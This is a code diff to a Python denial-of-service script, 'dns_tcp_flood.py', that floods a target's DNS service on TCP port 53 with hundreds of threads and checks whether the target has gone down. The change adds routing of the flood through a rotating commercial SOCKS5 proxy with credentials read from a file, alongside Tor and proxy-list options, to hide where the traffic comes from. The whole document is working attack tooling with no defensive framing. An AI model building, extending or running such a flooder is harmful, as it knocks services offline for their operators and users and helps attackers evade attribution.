@@ -9,8 +9,11 @@ Usage:
   python3 dns_tcp_flood.py --workers 500
 """
 
-import socket, struct, threading, time, random, argparse, itertools
+import socket, struct, threading, time, random, argparse, itertools, os
 from datetime import datetime
+
+CREDS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)),
+                          "proxies_webshare_backbone_creds.txt")
 
 try:
     import socks as pysocks
@@ -64,12 +67,20 @@ errors     = 0
 stop       = threading.Event()
 
 
-def _make_socket(use_tor, use_proxy):
-    if not PYSOCKS_OK and (use_tor or use_proxy):
+_ws_user = None
+_ws_pass = None
+
+
+def _make_socket(use_tor, use_proxy, use_webshare):
+    if not PYSOCKS_OK and (use_tor or use_proxy or use_webshare):
         raise RuntimeError("pip3 install pysocks")
     if use_tor:
         s = pysocks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
         s.set_proxy(pysocks.SOCKS5, "127.0.0.1", 9050)
+    elif use_webshare:
+        s = pysocks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
+        s.set_proxy(pysocks.SOCKS5, "p.webshare.io", 80,
+                    username=_ws_user, password=_ws_pass)
     elif use_proxy:
         ip, port_p, user, pwd = _next_proxy()
         s = pysocks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
@@ -79,12 +90,12 @@ def _make_socket(use_tor, use_proxy):
     return s
 
 
-def flood_worker(target, port, use_tor, use_proxy):
+def flood_worker(target, port, use_tor, use_proxy, use_webshare):
     global sent, errors
     pkt = build_query(FLOOD_DOMAIN, FLOOD_QTYPE)
     while not stop.is_set():
         try:
-            s = _make_socket(use_tor, use_proxy)
+            s = _make_socket(use_tor, use_proxy, use_webshare)
             s.settimeout(10)
             s.connect((target, port))
             s.sendall(pkt)
@@ -97,11 +108,11 @@ def flood_worker(target, port, use_tor, use_proxy):
                 errors += 1
 
 
-def probe(target, port, use_tor, use_proxy, timeout=3.0):
+def probe(target, port, use_tor, use_proxy, use_webshare, timeout=3.0):
     pkt = build_query("metoo-shatkin.com", 1)
     t0 = time.time()
     try:
-        s = _make_socket(use_tor, use_proxy)
+        s = _make_socket(use_tor, use_proxy, use_webshare)
         s.settimeout(timeout)
         s.connect((target, port))
         s.sendall(pkt)
@@ -125,10 +136,17 @@ def main():
                    help="Route via Tor SOCKS5 (127.0.0.1:9050)")
     p.add_argument("--proxy-file",     default=None,
                    help="ip:port:user:pass proxy list (HTTP CONNECT)")
+    p.add_argument("--webshare",       action="store_true",
+                   help=f"Use Webshare rotating SOCKS5 endpoint (creds from {CREDS_FILE})")
     args = p.parse_args()
 
-    global _proxy_cycle
+    global _proxy_cycle, _ws_user, _ws_pass
     use_proxy = False
+    if args.webshare:
+        with open(CREDS_FILE) as f:
+            lines = [l.strip() for l in f if l.strip()]
+        _ws_user = lines[0] + "-rotate"
+        _ws_pass = lines[1]
     if args.proxy_file:
         proxies = load_proxies(args.proxy_file)
         if not proxies:
@@ -138,7 +156,10 @@ def main():
         use_proxy = True
         print(f"  {G}[PROXY]{W} {len(proxies)} proxies loaded")
 
-    proxy_label = "Tor SOCKS5" if args.tor else (args.proxy_file + " (HTTP CONNECT rotating)" if use_proxy else "direct")
+    proxy_label = ("Tor SOCKS5" if args.tor
+                   else ("Webshare SOCKS5 rotating (p.webshare.io:80)" if args.webshare
+                   else (args.proxy_file + " (HTTP CONNECT rotating)" if use_proxy
+                   else "direct")))
     print(f"""
 {B}{'='*62}{W}
   DNS TCP Flood — port 53 TCP connection exhaustion
@@ -154,7 +175,7 @@ def main():
     for _ in range(args.workers):
         threading.Thread(
             target=flood_worker,
-            args=(args.target, args.port, args.tor, use_proxy),
+            args=(args.target, args.port, args.tor, use_proxy, args.webshare),
             daemon=True
         ).start()
 
@@ -169,7 +190,7 @@ def main():
             rps = (cur_sent - prev_sent) / args.check_interval
             prev_sent = cur_sent
 
-            ok, ms = probe(args.target, args.port, args.tor, use_proxy)
+            ok, ms = probe(args.target, args.port, args.tor, use_proxy, args.webshare)
             ts = datetime.now().strftime("%H:%M:%S")
 
             probe_str = f"{G}UP {ms:.0f}ms{W}" if ok else f"{R}DOWN {ms:.0f}ms{W}"
